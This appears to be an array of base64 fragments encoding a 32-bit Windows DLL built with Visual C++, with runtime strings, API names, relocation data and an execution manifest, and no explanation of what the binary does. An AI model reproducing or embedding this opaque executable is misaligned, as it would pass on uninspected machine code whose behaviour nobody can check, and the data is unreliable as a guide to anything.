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//5vdvWD////GhXD///8Am4qNYf///9Dh0PnQwYrBJA/XD77AgeEEBAAAi9oD2IPDEP8jgHoOBXURZoudXP///4DPAoDn/rM/6wRmuz8TZomdXv///9mtXv///7tsQAEQ2eWJlWz///+b3b1g////xoVw////ANnJio1h////2eWb3b1g////2cmKrWH////Q5dD90MWKxSQP14rg0OHQ+dDBisEkD9fQ5NDkCsQPvsCB4QQEAACL2gPYg8MQ/yPowQAAANnJ3djD6LcAAADr9t3Y3djZ7sPd2N3Y2ejD271i////261i////9oVp////QHQIxoVw////B8PGhXD///8B3AVkQAEQw9nJ271i////261i////9oVp////QHQJxoVw////B+sHxoVw////Ad7Bw9u9Yv///9utYv////aFaf///0B0INnJ271i////261i////9oVp////QHQJxoVw////B+sHxoVw////Ad7Bw93Y3djbLVBAARCAvXD///8AfwfGhXD///8BCsnDCsl0Atngw8zMzMzMzFWL7IPE4IlF4ItFGIlF8ItFHIlF9OsJVYvsg8TgiUXg3V34iU3ki0UQi00UiUXoiU3sjUUIjU3gUFFS6Bw0AACDxAzdRfhmgX0IfwJ0A9ltCMnDzMzMzMzMzMzMzMzMzNnA2fzc4dnJ2eDZ8Nno3sHZ/d3Zw4tUJASB4gADAACDyn9miVQkBtlsJAbDqQAACAB0BrgHAAAAw9wFgEABELgBAAAAw4tCBCUAAPB/PQAA8H90A90Cw4tCBIPsCg0AAP9/iUQkBotCBIsKD6TIC8HhC4lEJASJDCTbLCSDxAqpAAAAAItCBMOLRCQIJQAA8H89AADwf3QBw4tEJAjDZoE8JH8CdAPZLCRaw2aLBCRmPX8CdB5mg+AgdBWb3+Bmg+AgdAy4CAAAAOjp/v//WsPZLCRaw4PsCN0UJItEJASDxAglAADwf+sUg+wI3RQki0QkBIPECCUAAPB/dD09AADwf3RfZosEJGY9fwJ0KmaD4CB1IZvf4GaD4CB0GLgIAAAAg/oddAfoi/7//1rD6G3+//9aw9ksJFrD3QWsQAEQ2cnZ/d3Z2cDZ4dwdnEABEJvf4J64BAAAAHPH3A28QAEQ67/dBaRAARDZydn93dnZwNnh3B2UQAEQm9/gnrgDAAAAdp7cDbRAARDrljPAw8yLVCQMi0wkBIXSdH8PtkQkCA+6JbyGARABcw2LTCQMV4t8JAjzqutdi1QkDIH6gAAAAHwOD7olEHABEAEPgjMzAABXi/mD+gRyMffZg+EDdAwr0YgHg8cBg+kBdfaLyMHgCAPBi8jB4BADwYvKg+IDwekCdAbzq4XSdAqIB4PHAYPqAXX2i0QkCF/Di0QkBMOhhKEBEFZqFF6FwHUHuAACAADrBjvGfQeLxqOEoQEQagRQ6Fqt//+jgKEBEFlZhcB1HmoEVok1hKEBEOhBrf//o4ChARBZWYXAdQVqGlhewzPSucB5ARCJDAKDwSCNUgSB+UB8ARB9B6GAoQEQ6+gzwF7D6D4wAACAPeSGARAAdAXoJzMAAP81gKEBEOgysP//gyWAoQEQAFnDuMB5ARDDVYvsVot1CLnAeQEQO/FyIoH+IHwBEHcai8YrwcH4BYPAEFDoDun//4FODACAAABZ6wqNRiBQ/xXYAAEQXl3DVYvsi0UIg/gUfRaDwBBQ6OPo//+LRQxZgUgMAIAAAF3Di0UMg8AgUP8V2AABEF3DVYvsi0UIucB5ARA7wXIfPSB8ARB3GIFgDP9///8rwcH4BYPAEFDoBur//1ldw4PAIFD/FdwAARBdw1WL7ItNCItFDIP5FH0TgWAM/3///41BEFDo2en//1ldw4PAIFD/FdwAARBdw1WL7ItFCIXAdRXoD77//8cAFgAAAOh/uv//g8j/XcOLQBBdw1WL7ItNCIP5/nUN6Oq9///HAAkAAADrOIXJeCQ7DSSiARBzHIvBg+EfwfgFweEGiwSFEIcBEA++RAgEg+BAXcPotb3//8cACQAAAOgluv//M8Bdw2oQaLhgARDoZqz//zPbiV3ki3UIg/7+dRfoVL3//4kY6IG9///HAAkAAADptgAAAIX2D4iXAAAAOzUkogEQD4OLAAAAi97B+wWL/oPnH8HnBosEnRCHARAPvkQ4BIPgAXUK6Au9//+DIADralbo6jEAAFmDZfwAiwSdEIcBEPZEOAQBdBP/dRD/dQxW6F4AAACDxAyL+OsW6Am9///HAAkAAADoyrz//4MgAIPP/4l95MdF/P7////oCgAAAIvH6yiLdQiLfeRW6AozAABZw+ievP//iRjoy7z//8cACQAAAOg7uf//g8j/6Mmr///DVYvsuPAaAADoVjQAAKEIcAEQM8WJRfyDpUTl//8Ai0UIi00MVjP2iYU45f//VzP/iY0w5f//ibVA5f//OXUQdQczwOkNCAAAhcl1H+gyvP//ITDoX7z//8cAFgAAAOjPuP//g8j/6eoHAACL0IvIwfoFg+EfweEGiZUo5f//U4sUlRCHARCJjSTl//+KXBEkAtvQ+4D7AnQFgPsBdSuLRRD30KgBdRzo17v//yEw6AS8///HABYAAADodLj//+mIBwAAi4U45f//9kQRBCB0D2oCagBqAFDohQgAAIPEEP+1OOX//+jT/f//WYXAD4RQAwAAi4Uo5f//i40k5f//iwSFEIcBEPZEAQSAD4QyAwAA6Nm+//8zyYtAbDmIqAAAAI2FGOX//1CLhSjl//8PlMGJjTzl//+LjSTl//+LBIUQhwEQ/zQB/xUEAQEQhcAPhO4CAAA5tTzl//90CITbD4TeAgAA/xUAAQEQi5Uw5f//M8khjTjl//+JhRDl//+JjTTl//+JlSzl/','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=','UAAABlAG4ALQBiAHoAAABlAG4ALQBjAGEAAABlAG4ALQBjAGIAAABlAG4ALQBnAGIAAABlAG4ALQBpAGUAAABlAG4ALQBqAG0AAABlAG4ALQBuAHoAAABlAG4ALQBwAGgAAABlAG4ALQB0AHQAAABlAG4ALQB1AHMAAABlAG4ALQB6AGEAAABlAG4ALQB6AHcAAABlAHMALQBhAHIAAABlAHMALQBiAG8AAABlAHMALQBjAGwAAABlAHMALQBjAG8AAABlAHMALQBjAHIAAABlAHMALQBkAG8AAABlAHMALQBlAG','BY3RpdmVXaW5kb3cAR2V0TGFzdEFjdGl2ZVBvcHVwAABHZXRVc2VyT2JqZWN0SW5mb3JtYXRpb25XAAAAR2V0UHJvY2Vzc1dpbmRvd1N0YXRpb24AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAA','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